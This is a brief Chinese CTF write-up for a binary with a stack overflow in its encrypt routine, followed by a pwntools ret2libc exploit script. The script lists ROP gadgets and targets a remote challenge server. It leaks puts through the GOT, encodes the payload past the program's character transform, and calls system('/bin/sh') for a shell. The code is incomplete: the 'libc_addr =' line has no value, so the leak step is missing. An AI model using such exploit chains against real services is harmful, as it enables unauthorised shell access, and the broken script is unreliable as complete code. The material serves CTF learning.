### IDA 分析

encrypt 函数中有个栈溢出，这题直接ret2libc

![2.png-39.5kB](http://static.zybuluo.com/hgggg/8o7absc9hgkjttq01vk27xh9/2.png)

### exp

```
from pwn import *

 

elf = ELF ('/home/hgg/Desktop/pwn/pwn2')

libc = ELF('/home/hgg/Desktop/libc-2.27.so')

 

 

context.log_level = 'debug'

context.arch = 'amd64'

 

 

 

'''

0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret

0x0000000000400c80 : pop r14 ; pop r15 ; ret

0x0000000000400c82 : pop r15 ; ret

0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret

0x00000000004007f0 : pop rbp ; ret

0x0000000000400aec : pop rbx ; pop rbp ; ret

0x0000000000400c83 : pop rdi ; ret

0x0000000000400c81 : pop rsi ; pop r15 ; ret

0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret

0x00000000004006b9 : ret

0x00000000004008ca : ret 0x2017

0x0000000000400962 : ret 0x458b

0x00000000004009c5 : ret 0xbf02

 

Unique gadgets found: 15

 

'''

#p = process('pwn2')

p = remote("1.14.71.254",28015)

 

main = elf.sym['main']

puts_got = elf.got['puts']

puts_plt = elf.plt['puts']

pop_rdi = 0x400c83

pop_4 = 0x400c7c

ret = 0x4006b9

 

payload = b'a'*0x50+p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)

def encrypt(payload):

	p = ""

	for x in payload:

		x = chr(x)

		if ord(x)<=96 or ord(x)>122:

			if ord(x)<=64 or ord(x)>90:

				if ord(x)>47 and ord(x)<=57:

					x=chr(ord(x)^0xc)

			else:

				x=chr(ord(x)^0xd)

		else:

			x=chr(ord(x)^0xe)

		p += x

	return(p)

 

p.recvuntil("Input your choice!\n")

p.sendline("1")

p.recvuntil("Input your Plaintext to be encrypted\n")

p.sendline(encrypt(payload))

 

libc_addr =  

 

print(hex(libc_addr))

 

system = libc_addr + libc.sym['system']

bin_sh = libc_addr + 0x1b3e9a

#gdb.attach(p)

payload2 = b'a'*0x50+p64(0)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(main)

p.recvuntil("Input your choice!\n")

p.sendline("1")

p.recvuntil("Input your Plaintext to be encrypted\n")

p.sendline(payload2)

p.interactive()
```